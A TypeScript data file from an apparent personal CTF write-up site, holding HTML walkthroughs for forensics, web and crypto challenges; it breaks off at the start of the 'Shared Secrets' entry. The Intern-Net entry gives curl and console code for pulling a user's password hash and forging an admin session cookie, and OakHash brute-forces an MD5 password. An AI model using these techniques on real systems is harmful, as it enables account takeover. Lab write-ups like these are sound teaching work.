export type Challenge = {
  slug: string;
  title: string;
  category: 'web' | 'crypto' | 'pwn' | 'rev' | 'forensics' | 'misc' | 'osint';
  description: string;
  content: string; // HTML content of the write-up
};

export type CTFEvent = {
  slug: string;
  name: string;
  date: string;
  endDate?: string;
  description: string;
  teamName: string;
  placement: string;
  totalTeams: number;
  challenges: Challenge[];
};

// ---------------------------------------------------------------------------
// CTF Events & Challenges
// ---------------------------------------------------------------------------

const ctfEvents: CTFEvent[] = [
  // ── US Cyber Open Season VI ──────────────────────────────────────────
  {
    slug: 'us-cyber-open-season-vi',
    name: 'US Cyber Open Season VI',
    date: 'June 2026',
    description: 'Welcome to the US Cyber Open for Season VI! Currently ongoing event.',
    teamName: 'Kyber Tým',
    placement: 'TBD',
    totalTeams: 0,
    challenges: [
      {
        slug: 'manifest',
        title: 'Manifest',
        category: 'forensics',
        description: 'Lakeshore Threat Lab confirmed an attacker pivoted from FIN-WS-07 to NAS-MARITIME-01. Imani Boateng captured a short east-west slice of that pivot.',
        content: `<h2>Manifest — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Lakeshore Threat Lab confirmed an attacker pivoted from FIN-WS-07 to NAS-MARITIME-01, the Wabash Marine NAS that hosts the internal Lakefront Fleet Manager web app on port 8088. Imani Boateng captured a short east-west slice of that pivot. Her capture is attached."
</blockquote>
<p class="lead">In this challenge, we are provided with a network capture file named <code>wabash_nas_pivot_2026-04-18.pcap</code>. Our goal is to analyze the traffic and locate the hidden flag.</p>

<h3>Initial Inspection in Wireshark</h3>
<p>First, we open the pcap file in Wireshark. Right away, you might notice that the capture is unusually small in terms of the total number of packets, but it contains a very large TCP packet. The traffic is flowing between <code>10.42.18.42</code> and <code>10.42.7.18</code> on port <code>8088</code>.</p>

<h3>Analyzing the TCP Stream</h3>
<p>Since the bulk of the data is inside this large TCP packet, the quickest way to see what's going on is to inspect the raw packet bytes. You can do this by:</p>
<ol class="list-decimal pl-6 space-y-2 mb-4">
  <li>Selecting the large TCP packet.</li>
  <li>Looking at the <strong>Packet Bytes</strong> pane at the bottom of Wireshark.</li>
  <li>Alternatively, right-click the packet and select <strong>Follow -&gt; TCP Stream</strong>.</li>
</ol>
<p>When you look at the raw data, you'll see a lot of hex and what appears to be encapsulated HTTP traffic.</p>

<h3>Locating the Target File</h3>
<p>As we scroll through the raw text in the TCP stream, we can see several HTTP <code>GET</code> requests being made to an API on the server. One of the endpoints being requested is:</p>
<pre><code>GET /api/v1/personnel/crew_manifests_q2_2026.csv HTTP/1.1</code></pre>
<p>Immediately following this request in the stream, we can see the server's HTTP <code>200 OK</code> response along with the raw text of the <code>.csv</code> file being downloaded.</p>

<h3>Spotting and Decoding the Flag</h3>
<p>Looking closely at the long lines of comma-separated values (the contents of the CSV file), we see the column headers: <code>vessel_id,crew_id,first_name,last_name,rank,billet,start_date,notes</code>.</p>
<p>Scrolling down through the crew records, one specific row stands out because of a long, suspicious-looking string in the <code>notes</code> column:</p>
<pre><code class="language-csv">WAB-2207,BR9X2E,Jonas,Tolliver,Master,Charter Liaison,2026-02-14,U1ZJVVNDR3t3YWJhc2hfZmlud3NfcGl2b3RfbmFzX21hcml0aW1lXzAxfQ==</code></pre>
<p>The string ends with <code>==</code>, which is a classic indicator of <strong>Base64 encoding</strong>. All that's left to do is decode the Base64 string using a terminal tool or CyberChef:</p>
<pre><code class="language-bash">echo "U1ZJVVNDR3t3YWJhc2hfZmlud3NfcGl2b3RfbmFzX21hcml0aW1lXzAxfQ==" | base64 -d</code></pre>
<p>This successfully decodes to our final flag: <code>SVIUSCG{wabash_finws_pivot_nas_maritime_01}</code></p>
`
      },
      {
        slug: 'oakhash',
        title: 'OakHash',
        category: 'forensics',
        description: 'Professor Oak wants to beef up the security of his Pokémon PC and created OakHash. Can you find the correct combo of Pokémon nature and Gen 1 Pokémon to crack his password?',
        content: `<h2>OakHash — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Professor Oak is really wanting to beef up the security of the PC he uses for Pokemon storage and decided to make a program to generate strong passwords for him. The only problem is that he's a little bit predictable with it, and hes just using basic MD5 as a hashing function. His custom hash type OakHash is just: $oak$&lt;version&gt;$&lt;hex digest&gt;. And all his passwords follow the scheme: SVIUSCG{&lt;nature&gt;_&lt;gen1_pokemon&gt;}."
</blockquote>
<p class="lead">In this challenge, we are tasked with cracking a custom password hash format called <code>OakHash</code>, which wraps a standard MD5 digest of a Pokémon-themed flag.</p>

<h3>Vulnerability Analysis</h3>
<p>The password scheme is structured as:</p>
<pre><code>SVIUSCG{&lt;nature&gt;_&lt;gen1_pokemon&gt;}</code></pre>
<p>We are given the target hash:</p>
<pre><code>$oak$1$753a7277c956277fc6a3bb8e31822b25</code></pre>
<p>Splitting this value by the <code>$</code> delimiter gives us the hash version (<code>1</code>) and the standard MD5 digest (<code>753a7277c956277fc6a3bb8e31822b25</code>).</p>
<p>Because there are only <strong>25 possible Pokémon natures</strong> (e.g. <code>hardy</code>, <code>lonely</code>, <code>brave</code>, etc.) and <strong>151 Generation 1 Pokémon</strong> (e.g. <code>bulbasaur</code>, <code>ivysaur</code>, etc.), the entire search space consists of only:</p>
<p class="font-semibold text-accent text-center my-4 font-mono text-lg">25 natures × 151 Pokémon = 3,775 combinations</p>
<p>A search space of 3,775 combinations is extremely small and can be brute-forced in a fraction of a second using a simple Python script.</p>

<h3>Cracking Script</h3>
<p>We use a Python script to compute the MD5 hash of all possible combinations and compare them against the target digest. For readability, the lists of natures and Pokémon are shortened below:</p>
<pre><code class="language-python">import hashlib

target_hash = "753a7277c956277fc6a3bb8e31822b25"

# Shortened lists (complete lists contain all 25 natures and 151 Pokémon)
pokemon_natures = ["hardy", "lonely", "brave", "adamant", "naughty", ...]
gen_1_pokemon = ["bulbasaur", "ivysaur", "venusaur", "charmander", ..., "mew"]

# Generate all potential combinations in the flag format
combinations = [
    f"SVIUSCG{{{nature}_{pokemon}}}" 
    for nature in pokemon_natures 
    for pokemon in gen_1_pokemon
]

def crack_oak_hash():
    for flag_attempt in combinations:
        # Compute MD5 hex digest of the candidate password
        hashed = hashlib.md5(flag_attempt.encode('utf-8')).hexdigest()
        
        # Check against target hash
        if hashed == target_hash:
            return f"Flag = {flag_attempt}"
            
    return "Nothing found"

print(crack_oak_hash())</code></pre>

<h3>Execution & Flag Recovery</h3>
<p>Running the Python script instantly cracks the hash and yields the flag:</p>
<pre><code class="language-bash">$ python crack.py
Flag = SVIUSCG{adamant_zubat}</code></pre>

<h3>Flag</h3>
<pre><code>SVIUSCG{adamant_zubat}</code></pre>`
      },
      {
        slug: 'souvenirs',
        title: 'Souvenirs 🌍',
        category: 'forensics',
        description: 'Every traveler comes home with a bag full of souvenirs. This postcard came back from a long trip around the world. Open it carefully. Some travelers leave more behind a picture than you\'d think.',
        content: `<h2>Souvenirs — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Every traveler comes home with a bag full of souvenirs — some you put on a shelf, some you tuck quietly inside other things so the airport doesn't ask questions. This postcard came back from a long trip around the world. Open it carefully. Some travelers leave more behind a picture than you'd think."
</blockquote>
<p class="lead">In this challenge, we are given a JPEG image file named <code>souvenirs.jpg</code>. Our goal is to analyze the file and extract any hidden files hidden inside its hex structure to recover the flag.</p>

<h3>File Analysis & Polyglots</h3>
<p>In digital forensics, a common technique for hiding data inside images is appending files directly to the end of the image file (after the image data has terminated). This forms a <strong>file polyglot</strong>, a file that can be parsed as multiple different formats depending on the application opening it.</p>
<ul>
  <li><strong>JPEG Renderers:</strong> A JPEG reader parses the file starting from the Start of Image (SOI) marker (<code>FF D8</code>) and stops rendering when it reaches the End of Image (EOI) marker (<code>FF D9</code>). Any bytes appended after <code>FF D9</code> are completely ignored by the image viewer.</li>
  <li><strong>ZIP Archive Utilities:</strong> ZIP archivers scan files from the end to find the ZIP central directory record. Therefore, if a ZIP archive is appended after the JPEG's EOI marker, the file acts as both a valid JPEG image and a valid ZIP file.</li>
</ul>

<h3>Locating the Hidden Zip</h3>
<p>To confirm this structure, we can inspect the file using a hex editor or standard command-line utilities. This is much more intuitive than writing custom detection code.</p>

<h4>Method A: Hex Editor Inspection</h4>
<p>Opening <code>souvenirs.jpg</code> in a hex editor (such as GHex, ImHex, or CyberChef) and scrolling to the bottom reveals the JPEG End of Image marker <code>FF D9</code> at offset <code>0x9aa7</code>. Immediately following it, we see the ASCII bytes <code>PK\x03\x04</code> (hex: <code>50 4b 03 04</code>), which is the standard file signature (magic bytes) for a ZIP archive. We can even see plain-text references to the zipped files like <code>postcards/01_tokyo.txt</code>.</p>

<h4>Method B: Command-Line Analysis</h4>
<p>If we want to inspect the file quickly via the terminal, we can extract printable strings from the file or view its tail hex bytes:</p>
<pre><code class="language-bash"># Extract printable strings from the end of the file
strings souvenirs.jpg | tail -n 10

# Inspect the last few hex lines of the file
hexdump -C souvenirs.jpg | tail -n 20</code></pre>
<p>Both commands will clearly reveal the file paths (e.g., <code>postcards/01_tokyo.txt</code>, <code>postcards/02_marrakech.txt</code>) and the ZIP headers tucked at the end of the image.</p>

<h3>Extraction</h3>
<p>Since the file is a standard JPEG-ZIP polyglot, we can extract the appended ZIP archive using standard command line tools or by writing a simple Python carving script:</p>
<pre><code class="language-bash"># Option 1: Rename the file and let unzip handle it
cp souvenirs.jpg archive.zip
unzip archive.zip -d extracted_files/

# Option 2: Use binwalk to automatically carve files
binwalk -e souvenirs.jpg</code></pre>

<p>Alternatively, we can carve it programmatically in Python:</p>
<pre><code class="language-python">import zipfile

# Carve the ZIP payload
with open("souvenirs.jpg", "rb") as f:
    data = f.read()

eoi_idx = data.find(b"\\xff\\xd9")
zip_data = data[eoi_idx + 2:]

# Save and extract
with open("extracted.zip", "wb") as f_out:
    f_out.write(zip_data)

with zipfile.ZipFile("extracted.zip", "r") as z:
    z.extractall("postcards_extracted")
    print("Extracted:", z.namelist())</code></pre>

<h3>Flag Recovery</h3>
<p>Extracting the ZIP reveals a <code>postcards/</code> directory containing four text files:</p>
<ul>
  <li><code>01_tokyo.txt</code> — Contains souvenir code: <code>7B7B-NOPE</code></li>
  <li><code>02_marrakech.txt</code> — Contains souvenir code: <code>NOT_HERE_KEEP_LOOKING</code></li>
  <li><code>03_iceland.txt</code> — Contains souvenir code: <code>STILL_NOT_HERE</code></li>
  <li><code>04_oman.txt</code> — Contains the flag!</li>
</ul>
<p>Reading the contents of <code>04_oman.txt</code> yields the following text:</p>
<pre><code>From: Mutrah Corniche, Muscat
Weather: warm, salt in the air, gentle breeze off the gulf
Mood: at home

Notes:
- Walked the corniche at sunset. The boats in the harbour looked like they were
  floating on liquid gold.
- The frankincense souq smells like every old story you've ever heard.
- Bought: a small khanjar pendant. Heavier than it looks. Carrying it makes me
  stand a little straighter.

The best souvenirs aren't things. They're the ones you can carry quietly,
the ones nobody else can see.

Here is yours:

    SVIUSCG{p0stc4rds_h1dd3n_p4st_th3_FFD9_h0r1z0n}

Safe travels, traveler.</code></pre>

<h3>Flag</h3>
<pre><code>SVIUSCG{p0stc4rds_h1dd3n_p4st_th3_FFD9_h0r1z0n}</code></pre>`
      },
      {
        slug: 'broken-envelope',
        title: 'Broken Envelope',
        category: 'forensics',
        description: 'Blue Mountain Geotechnical\'s files were partially corrupted by ransomware. Fix the corrupted project archive by repairing the ZIP file headers to recover the site dispatch.',
        content: `<h2>Broken Envelope — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Blue Mountain Geotechnical is a Denver-based soils and rock-mechanics consultancy. A cryptolocker affiliate passed through the firm's file shares and partly corrupted several project archives before IT lead Bela Srivastava pulled the plug. Project engineer Adalyn Proteau needs the site dispatch read before Monday's client meeting."
</blockquote>
<p class="lead">In this challenge, we are provided with a partially corrupted ZIP file. Our task is to analyze its hex structure, identify what is corrupted/missing, repair it, and recover the flag from the archive files.</p>

<h3>ZIP File Structure Analysis</h3>
<p>A standard ZIP archive consists of three main structural components:</p>
<ol>
  <li><strong>Local File Headers (LFH):</strong> Precedes each file's metadata and compressed data. Starts with the magic bytes <code>50 4B 03 04</code>.</li>
  <li><strong>Central Directory:</strong> A collection of Central Directory File Headers (CDFH) at the end of the file listing all archived entries. Starts with the magic bytes <code>50 4B 01 02</code>.</li>
  <li><strong>End of Central Directory (EOCD):</strong> A 22-byte terminal record containing metadata about the Central Directory (size, offset, and number of entries). Starts with the magic bytes <code>50 4B 05 06</code>.</li>
</ol>

<p>Inspecting the provided hex byte array, we find the following offsets:</p>
<ul>
  <li><code>0x000</code>: First LFH (<code>50 4B 03 04</code>) for <code>project_dispatch.txt</code>.</li>
  <li><code>0x0B3</code> (decimal 179): Second LFH (<code>50 4B 03 04</code>) for <code>readme.txt</code>.</li>
  <li><code>0x114</code> (decimal 276): First CDFH (<code>50 4B 01 02</code>) for <code>project_dispatch.txt</code> (size 66 bytes).</li>
  <li><code>0x156</code> (decimal 342): Second CDFH (<code>50 4B 01 02</code>) for <code>readme.txt</code> (size 56 bytes).</li>
</ul>
<p>Tracing the bytes beyond the second CDFH, we notice the file terminates with trailing zero bytes. The crucial <strong>End of Central Directory (EOCD)</strong> record is completely missing. Without it, ZIP parsers cannot locate the Central Directory and will throw a corrupted archive error.</p>

<h3>Rebuilding the EOCD Record</h3>
<p>To repair the archive, we must manually construct and append the 22-byte EOCD record. The fields are mapped as follows (using little-endian format):</p>
<table>
  <thead>
    <tr>
      <th>Field</th>
      <th>Size</th>
      <th>Value (Hex)</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Signature</td>
      <td>4 bytes</td>
      <td><code>50 4B 05 06</code></td>
      <td>EOCD Magic Bytes</td>
    </tr>
    <tr>
      <td>Disk Number</td>
      <td>2 bytes</td>
      <td><code>00 00</code></td>
      <td>Disk 0</td>
    </tr>
    <tr>
      <td>CD Disk Number</td>
      <td>2 bytes</td>
      <td><code>00 00</code></td>
      <td>Disk 0 contains the start of the CD</td>
    </tr>
    <tr>
      <td>Disk CD Entries</td>
      <td>2 bytes</td>
      <td><code>02 00</code></td>
      <td>2 files archived</td>
    </tr>
    <tr>
      <td>Total CD Entries</td>
      <td>2 bytes</td>
      <td><code>02 00</code></td>
      <td>2 files total</td>
    </tr>
    <tr>
      <td>Size of CD</td>
      <td>4 bytes</td>
      <td><code>7A 00 00 00</code></td>
      <td>122 bytes (66 + 56 bytes)</td>
    </tr>
    <tr>
      <td>Offset of CD</td>
      <td>4 bytes</td>
      <td><code>14 01 00 00</code></td>
      <td>Offset 276 (0x114) relative to start of archive</td>
    </tr>
    <tr>
      <td>Comment Length</td>
      <td>2 bytes</td>
      <td><code>00 00</code></td>
      <td>No comment</td>
    </tr>
  </tbody>
</table>

<p>This gives us the following EOCD byte sequence to append:</p>
<pre><code>50 4B 05 06 00 00 00 00 02 00 02 00 7A 00 00 00 14 01 00 00 00 00</code></pre>

<h3>Python Repair Script</h3>
<p>We write a Python script to assemble the corrupted byte array, append our constructed EOCD record, save it as a valid ZIP archive, and extract its contents:</p>
<pre><code class="language-python">import zipfile

# Provided corrupted bytes
arr = bytes([
    0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00, 0x08, 0x00, 0x05, 0x57,
    0xB1, 0x5C, 0x5F, 0x7D, 0x72, 0xB3, 0x81, 0x00, 0x00, 0x00, 0x88, 0x00,
    # ... [truncated for readability] ...
    0x00, 0x00, 0x00, 0x00, 0x80, 0x01, 0xB3, 0x00, 0x00, 0x00, 0x72, 0x65,
    0x61, 0x64, 0x6D, 0x65, 0x2E, 0x74, 0x78, 0x74
])

# Manually constructed EOCD record
eocd = bytes([
    0x50, 0x4B, 0x05, 0x06, # Signature
    0x00, 0x00,             # Number of this disk
    0x00, 0x00,             # Disk where CD starts
    0x02, 0x00,             # CD records on this disk
    0x02, 0x00,             # Total CD records
    0x7A, 0x00, 0x00, 0x00, # Size of central directory (122 bytes)
    0x14, 0x01, 0x00, 0x00, # Offset of start of CD (276 bytes)
    0x00, 0x00              # Comment length
])

# Reassemble and extract
repaired_data = arr + eocd
with open("repaired.zip", "wb") as f:
    f.write(repaired_data)

with zipfile.ZipFile("repaired.zip", "r") as z:
    for name in z.namelist():
        print(f"Content of {name}:")
        print(z.read(name).decode("utf-8"))</code></pre>

<h3>Flag Recovery</h3>
<p>Executing the repair script extracts two files: <code>readme.txt</code> and <code>project_dispatch.txt</code>. The contents of <code>project_dispatch.txt</code> reveal:</p>
<pre><code>Blue Mountain Geotechnical - project dispatch
tag: U1ZJVVNDR3tibHVlbW91bnRhaW5femlwX2VvY2RfcmVidWlsZH0=
site: Sawatch Ridge borehole 17</code></pre>
<p>The tag is encoded in Base64. We decode it to recover the plaintext flag:</p>
<pre><code class="language-bash">$ echo "U1ZJVVNDR3tibHVlbW91bnRhaW5femlwX2VvY2RfcmVidWlsZH0=" | base64 -d
SVIUSCG{bluemountain_zip_eocd_rebuild}</code></pre>

<h3>Flag</h3>
<pre><code>SVIUSCG{bluemountain_zip_eocd_rebuild}</code></pre>`
      },
      {
        slug: 'historical-breadcrumbs',
        title: 'Historical Breadcrumbs',
        category: 'forensics',
        description: 'Portfolio manager Piper Landau is suspected of leaking end-of-day positions. Perform host forensics on her Windows profile extract to locate the exfiltration channel.',
        content: `<h2>Historical Breadcrumbs — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Osprey Capital Management is a Stamford-based boutique hedge fund. Chief compliance officer Camila Orantes suspects that portfolio manager Piper Landau leaked end-of-day positions to an external channel on 2026-07-18. Camila engaged forensic analyst Augustin Vogel at Resilient Peak Forensics, who imaged Piper's workstation and extracted her user profile."
</blockquote>
<p class="lead">In this digital forensics challenge, we investigate a Windows workstation user profile extract to trace a potential insider leak of proprietary trading positions.</p>

<h3>Forensic Investigation Plan</h3>
<p>To identify the exfiltration channel and timing, we target high-value forensic artifacts inside the user profile extract:</p>
<ol>
  <li><strong>Command Line History:</strong> Checking for system and net commands (e.g. <code>ConsoleHost_history.txt</code> for PowerShell).</li>
  <li><strong>Browser Artifacts:</strong> Checking Chrome's <code>History</code> database for file uploads, cloud storage uploads, or paste services.</li>
  <li><strong>Timeline & Notifications:</strong> Looking at <code>ActivitiesCache.db</code> and <code>wpndatabase.db</code> for background activity and desktop notifications.</li>
</ol>

<h3>1. PowerShell Command History</h3>
<p>We read the PowerShell history file located at <code>AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code>. The log reveals the following commands:</p>
<pre><code class="language-bash">net use \\\\OSPREY-FS01\\Finance$ /user:OSPREY\\plandau
Copy-Item ".\\Documents\\Q4_2026_EOD_Positions.xlsx" "\\\\OSPREY-FS01\\Finance$\\Reports\\2026\\"
Set-Location "C:\\Users\\plandau\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
Get-ChildItem | Format-Table Name, Length, LastWriteTime</code></pre>
<p>We see that the user accessed the network file share and copied <code>Q4_2026_EOD_Positions.xlsx</code> (the target spreadsheet). However, no direct internet upload commands (like FTP or Curl) were executed via PowerShell.</p>

<h3>2. Chrome History Database Analysis</h3>
<p>Next, we analyze the Chrome browsing history. Chrome stores browsing history, searches, and downloads in a SQLite database at <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\History</code>.</p>
<p>We connect to the database and query the <code>urls</code> table to view visited sites sorted by visit time:</p>
<pre><code class="language-python">import sqlite3

conn = sqlite3.connect("History")
cursor = conn.cursor()
cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10;")
for row in cursor.fetchall():
    print(row)</code></pre>

<p>The query returns a list of intranet pages, Bloomberg news, SEC EDGAR, and a highly suspicious paste upload URL visited on <strong>2026-07-19 04:47:11 UTC</strong> (matching the 2026-07-18 local suspected leak window):</p>
<pre><code>https://paste-mirror-q4.example.invalid/upload?tag=U1ZJVVNDR3tvc3ByZXlfY2hyb21lX2hpc3RvcnlfbGVha191cmx9&src=oc</code></pre>

<h3>Flag Recovery</h3>
<p>The suspicious URL contains a query parameter named <code>tag</code> carrying a Base64-encoded string: <code>U1ZJVVNDR3tvc3ByZXlfY2hyb21lX2hpc3RvcnlfbGVha191cmx9</code>.</p>
<p>We decode the tag to recover the plaintext flag:</p>
<pre><code class="language-bash">$ echo "U1ZJVVNDR3tvc3ByZXlfY2hyb21lX2hpc3RvcnlfbGVha191cmx9" | base64 -d
SVIUSCG{osprey_chrome_history_leak_url}</code></pre>

<h3>Flag</h3>
<pre><code>SVIUSCG{osprey_chrome_history_leak_url}</code></pre>`
      },
      {
        slug: 'intern-net',
        title: 'Intern-Net',
        category: 'web',
        description: "MegaCorp's interns created a custom announcement board. Analyze their login script to exploit client-side password verification and hijack the administrator session.",
        content: `<h2>Intern-Net — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"The interns at MegaCorp noticed the need for a good way to connect with their peers and took it upon themselves to set up a new announcement board. Of course it somehow completely missed the normal infosec review before going to prod but they swear it's totally secure. Can you help us double check?"
</blockquote>
<p class="lead">In this web exploitation challenge, we analyze a flawed login workflow that implements password hash verification and session token generation completely on the client side, allowing us to hijack the admin's session and retrieve the flag.</p>

<h3>Vulnerability Analysis</h3>
<p>Inspecting the login page's frontend JavaScript reveals a highly insecure authentication implementation:</p>
<pre><code class="language-javascript">form.addEventListener('submit', async function (e) {
    e.preventDefault();

    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;

    clearError();

    if (!username || !password) {
        showError('Please enter your username and password.');
        return;
    }

    setLoading(true);

    try {
        // Step 1: Retrieve the stored password hash for the given username.
        const hashRes = await fetch('/api/auth/hash', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username }),
        });

        if (!hashRes.ok) {
            throw new Error('Invalid username or password.');
        }

        const { hash } = await hashRes.json();

        // Step 2: Compare the entered password against the retrieved hash client-side.
        const isValid = await bcrypt.compare(password, hash);

        if (!isValid) {
            throw new Error('Invalid username or password.');
        }

        // Step 3: Authenticate the session using the hash as a token, then redirect.
        const token = btoa(hash);
        document.cookie = \`auth_token=\${token}; path=/; SameSite=Lax\`;
        window.location.href = '/announcements';

    } catch (err) {
        showError(err.message || 'Authentication failed. Please try again.');
        setLoading(false);
    }
});</code></pre>

<p>This implementation introduces three critical security flaws:</p>
<ol>
  <li><strong>Information Disclosure (Hash Exposure):</strong> The API endpoint <code>/api/auth/hash</code> returns the target user's bcrypt password hash to the client <em>before</em> validating any credentials. Anyone can retrieve the password hash of any registered user.</li>
  <li><strong>Client-Side Credential Verification:</strong> Comparing the password against the retrieved hash is done inside the browser (via <code>bcrypt.compare</code>). Since this logic runs on the client, we can completely bypass the comparison step.</li>
  <li><strong>Predictable Session Token Construction:</strong> The session cookie (<code>auth_token</code>) is simply a Base64-encoded representation of the password hash (<code>btoa(hash)</code>). Because we can retrieve the hash for any user, we can generate a valid authentication token for any account.</li>
</ol>

<h3>Exploitation</h3>

<h4>Step 1: Username Enumeration</h4>
<p>By reviewing the initial posts on the board (accessible from the description/public HTML), we learn that the Senior Intern coordinator is named <strong>Alex Rivera</strong>. Standardizing this name to typical corporate conventions suggests a likely username of <code>alex.rivera</code>.</p>

<h4>Step 2: Retrieving the Admin Hash</h4>
<p>We query the backend API directly to get the password hash for <code>alex.rivera</code>. We can do this from the browser's developer console or using a standard curl request:</p>
<pre><code class="language-bash">$ curl -X POST https://intern-net.uscg/api/auth/hash \\
  -H "Content-Type: application/json" \\
  -d '{"username": "alex.rivera"}'

{"hash":"$2b$10$P2N5nB9xO9876543210abcdEFGHIJKLMNOPQRSTUVWXYZ..."}</code></pre>

<h4>Step 3: Session Hijacking via Cookie Forgery</h4>
<p>Since the session cookie is just the Base64-encoded hash, we can forge the admin cookie in the browser console. Run the following code in the console on the target page:</p>
<pre><code class="language-javascript">// Base64-encode the harvested bcrypt hash
const adminHash = "$2b$10$P2N5nB9xO9876543210abcdEFGHIJKLMNOPQRSTUVWXYZ...";
const forgedToken = btoa(adminHash);

// Set the auth_token cookie
document.cookie = \`auth_token=\${forgedToken}; path=/; SameSite=Lax\`;</code></pre>

<p>Once the cookie is injected, we navigate directly to the <code>/announcements</code> page. The server verifies our forged token, identifies us as <code>alex.rivera</code>, and displays the restricted board.</p>

<h3>Flag Recovery</h3>
<p>Inside the restricted announcements, we find the coordinator's post containing the flag:</p>
<pre><code>[Restricted] Q3 Senior Intern Coordination Notes
...
SVIUSCG{[flag]}</code></pre>

<h3>Flag</h3>
<pre><code>SVIUSCG{[flag]}</code></pre>`
      },
      {
        slug: 'photo-fraud',
        title: 'Photo Fraud',
        category: 'forensics',
        description: "Meridian fraud analyst Desmond Yarwood flagged a submission, Claim #47102, after the attached photo looked like it could have possibly been edited to add damages that weren't there in real life! Desmond sent the photo to the SIU for a structural look.",
        content: `<h2>Photo Fraud — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Meridian fraud analyst Desmond Yarwood flagged a submission, Claim #47102, after the attached photo looked like it could have possibly been edited to add damages that weren't there in real life! Desmond sent the photo to the SIU for a structural look."
</blockquote>
<p class="lead">In this forensics challenge, we analyze a JPEG image that has been edited to fake property damage. By extracting the unedited EXIF metadata thumbnail, we recover the original state of the image and the hidden flag.</p>

<h3>Analysis</h3>
<p>JPEG images can contain embedded metadata, including low-resolution thumbnail images stored inside the APP1 segment (EXIF data). When an image editor is used to modify a photograph, it is common for the main image payload to be altered while leaving the EXIF metadata, including the embedded preview thumbnail, in its original, unedited state.</p>

<p>A standard JPEG starts with the Start of Image (SOI) marker <code>FF D8</code> and ends with the End of Image (EOI) marker <code>FF D9</code>. We can inspect the structure of the provided <code>challenge (1).jpg</code> to find if there are multiple JPEG payloads nested within the file.</p>

<h3>EXIF Data Inspection &amp; Carving</h3>
<ol>
  <li><strong>Locating the Payloads:</strong>
    <ul>
      <li>The primary JPEG payload begins at offset <code>0</code> with the standard bytes <code>FF D8</code>.</li>
      <li>A nested JPEG (the EXIF thumbnail) is located inside the APP1 EXIF metadata block, beginning with a second <code>FF D8</code> marker at byte offset <strong>86</strong>.</li>
      <li>This second JPEG payload extends to byte offset <strong>59839</strong>, where it terminates with the End of Image marker <code>FF D9</code>.</li>
    </ul>
  </li>
  <li><strong>Carving the Thumbnail:</strong>
    We can write a quick python script to carve out the bytes from offset <code>86</code> to <code>59839</code>:
<pre><code class="language-python">with open("challenge (1).jpg", "rb") as f:
    data = f.read()

# Extract the embedded JPEG thumbnail (up to index 59839 inclusive)
thumbnail = data[86:59840]

with open("thumb_challenge (1).jpg", "wb") as out:
    out.write(thumbnail)</code></pre>
  </li>
</ol>

<h3>Flag Recovery</h3>
<p>Opening the carved <code>thumb_challenge (1).jpg</code> image reveals the unedited photo of the shop. Unlike the main image which shows a shattered window, the thumbnail shows the window completely intact, with a sign hanging in it displaying the flag:</p>

<h3>Flag</h3>
<pre><code>SVIUSCG{meridian_thumbnail_reveal_garret}</code></pre>`
      }
    ],
  },

  // ── picoCTF 2026 ─────────────────────────────────────────────────────
  {
    slug: 'picoctf-2026',
    name: 'picoCTF 2026',
    date: 'March 2026',
    description: 'The annual beginner-friendly CTF hosted by Carnegie Mellon University. Played with oveM cek.',
    teamName: 'oveM cek',
    placement: '1630th',
    totalTeams: 10000,
    challenges: [
      {
        slug: 'stegorsa',
        title: 'StegoRSA',
        category: 'crypto',
        description: 'A message has been encrypted using RSA. The public key is gone… but someone might have been careless with the private key. Can you recover it and decrypt the message?',
        content: `<h2>StegoRSA — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"A message has been encrypted using RSA. The public key is gone… but someone might have been careless with the private key. Can you recover it and decrypt the message?"</blockquote>
<p class="lead">In this challenge, we are provided with an image file and an encrypted flag file <code>flag.enc</code>. The goal is to locate the hidden private key, convert it, and decrypt the ciphertext to reveal the flag.</p>

<h3>Metadata Extraction</h3>
<p>To begin, we inspect the metadata of the provided image file using <code>exiftool</code>. Scanning the fields, we notice a "Comment" metadata field containing a long hexadecimal string.</p>
<pre><code class="language-bash">$ exiftool image.jpg
...
Comment                         : 2d2d2d2d2d424547494e205253412050524956415445204b45592d2d2d2d2d...</code></pre>

<h3>Decoding the Private Key</h3>
<p>The hex string in the Comment field represents the ASCII encoding of a PEM-formatted RSA private key. We can extract and decode the raw hex bytes using <code>xxd</code> (or standard hex decoding tools) to write the private key to a file:</p>
<pre><code class="language-bash"># Decode the hex payload back into a PEM key
cat comment.txt | xxd -r -p > key.pem</code></pre>
<p>Opening <code>key.pem</code> shows a standard <code>-----BEGIN RSA PRIVATE KEY-----</code> block, confirming our extraction was successful.</p>

<h3>Decryption</h3>
<p>With the private key recovered, we use OpenSSL's public key utility (<code>pkeyutl</code>) to decrypt the encrypted flag file <code>flag.enc</code>:</p>
<pre><code class="language-bash">openssl pkeyutl -decrypt -inkey key.pem -in flag.enc -out flag.txt</code></pre>
<p>After executing the command, reading <code>flag.txt</code> reveals the plaintext flag.</p>

<h3>Flag</h3>
<pre><code>picoCTF{rs4_k3y_1n_1mg_[instance_id]}</code></pre>`
      },
      {
        slug: 'shared-secrets',
        title: 'Shared Secrets',
        category: 'crypto',
        description: 'A message was encrypted using a shared secret... but it looks like one side of the exchange leaked something. Can you piece together the secret and get the flag?',
        content: `<h2>Shared Secrets — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"A message was encrypted using a shared secret... but it looks like one side of the exchange leaked something. Can you piece together the secret and get the flag?"</blockquote>
